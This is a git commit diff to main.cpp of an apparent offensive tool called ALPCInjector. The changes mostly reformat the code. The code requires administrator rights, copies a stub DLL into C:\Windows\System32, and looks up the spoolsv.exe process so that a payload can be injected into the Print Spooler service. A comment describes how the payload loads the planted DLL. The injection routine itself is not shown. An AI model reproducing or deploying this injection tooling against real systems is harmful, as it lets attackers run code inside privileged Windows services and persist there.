65036cd214bb449ad7f19d0c782918dbf0098076
mDenis16 <topordenis164@gmail.com>
2023-12-07 10:39:08 +0200

    Fixed CopyFile in ALPCInjector

--- ALPCInjector/main.cpp
+++ ALPCInjector/main.cpp
@@ -12,44 +12,49 @@
 #include "ALPCInjector.hpp"
 #include <spdlog/spdlog.h>
 
-namespace InjectorConstants {
+namespace InjectorConstants
+{
     const int ProcessNotFoundErrorCode = 3;
 }
 
 /**
  * The function "ReadPayload" reads the contents of a binary file and returns them as a vector of
  * unsigned characters.
- * 
+ *
  * @param filePath The `filePath` parameter is a `std::string` that represents the path to the file
  * that needs to be read.
- * 
+ *
  * @return The function `ReadPayload` returns a `std::vector<unsigned char>`.
  */
-std::vector<unsigned char> ReadPayload(const std::string& filePath) {
+std::vector<unsigned char> ReadPayload(const std::string &filePath)
+{
     std::ifstream inputFile(filePath, std::ios::binary);
 
-    if (!inputFile.is_open()) {
+    if (!inputFile.is_open())
+    {
         std::cerr << "Error opening file: " << filePath << "\n";
         // Handle the error appropriately
         return {};
     }
 
-    return { std::istreambuf_iterator<char>{inputFile}, {} };
+    return {std::istreambuf_iterator<char>{inputFile}, {}};
 }
 
 /**
  * The function `GetProcessIdByExecutableName` retrieves the process ID of a running process based on
  * its executable name.
- * 
+ *
  * @param targetExecutable The targetExecutable parameter is a string that represents the name of the
  * executable file for which we want to retrieve the process ID.
- * 
+ *
  * @return a DWORD value, which represents the process ID of the target executable.
  */
-DWORD GetProcessIdByExecutableName(const std::string& targetExecutable) {
+DWORD GetProcessIdByExecutableName(const std::string &targetExecutable)
+{
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-    if (snapshot == INVALID_HANDLE_VALUE) {
+    if (snapshot == INVALID_HANDLE_VALUE)
+    {
         std::cerr << "Error creating process snapshot: " << GetLastError() << "\n";
         return 0;
     }
@@ -57,9 +62,12 @@ DWORD GetProcessIdByExecutableName(const std::string& targetExecutable) {
     PROCESSENTRY32 processEntry;
     processEntry.dwSize = sizeof(PROCESSENTRY32);
 
-    if (Process32First(snapshot, &processEntry)) {
-        do {
-            if (strcmp(processEntry.szExeFile, targetExecutable.c_str()) == 0) {
+    if (Process32First(snapshot, &processEntry))
+    {
+        do
+        {
+            if (strcmp(processEntry.szExeFile, targetExecutable.c_str()) == 0)
+            {
                 CloseHandle(snapshot);
                 return processEntry.th32ProcessID;
             }
@@ -72,17 +80,20 @@ DWORD GetProcessIdByExecutableName(const std::string& targetExecutable) {
 
 /**
  * The function checks if the current process is running with elevated privileges.
- * 
+ *
  * @return a boolean value indicating whether the current process is elevated or not.
  */
-bool IsCurrentProcessElevated() {
+bool IsCurrentProcessElevated()
+{
     HANDLE hToken;
     BOOL bResult = FALSE;
     TOKEN_ELEVATION te;
     DWORD dwSize;
 
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(TOKEN_ELEVATION), &dwSize)) {
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+    {
+        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(TOKEN_ELEVATION), &dwSize))
+        {
             bResult = te.TokenIsElevated;
         }
         CloseHandle(hToken);
@@ -95,23 +106,34 @@ bool IsCurrentProcessElevated() {
     Currently payload calls LoadLibrary without any absolute path, so it loads it straight from C:\Windows\System32
     A posible solutions is writing a dll path straight from injector somewhere in mmemory and use that in payload.
 */
-void MoveFileToSystem32(){
-    CopyFileA("stub.dll", "C:\\Windowws\\System32\\test.dll", FALSE);
+bool MoveFileToSystem32()
+{
+    BOOL result = CopyFileA("stub.dll", "C:\\Windows\\System32\\test.dll", FALSE);
+    if (!result)
+    {
+        spdlog::critical("Failed to copy stub.dll to C:\\Windows\\System32\\test.dll! [ERROR CODE {}]", GetLastError());
+        return false;
+    }
+    return true;
 }
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[])
+{
 
     spdlog::set_level(spdlog::level::debug);
-    
-    if (!IsCurrentProcessElevated()) {
+
+    if (!IsCurrentProcessElevated())
+    {
         std::cout << "Please run injector with administrator rights!\n";
         return 1;
     }
-    MoveFileToSystem32();
 
+    if (!MoveFileToSystem32())
+        return 2;
 
     const auto targetPid = GetProcessIdByExecutableName("spoolsv.exe");
 
-    if (targetPid == 0) {
+    if (targetPid == 0)
+    {
         std::cout << "Spoolsv.exe couldn't be found!" << std::endl;
         return InjectorConstants::ProcessNotFoundErrorCode;
     }
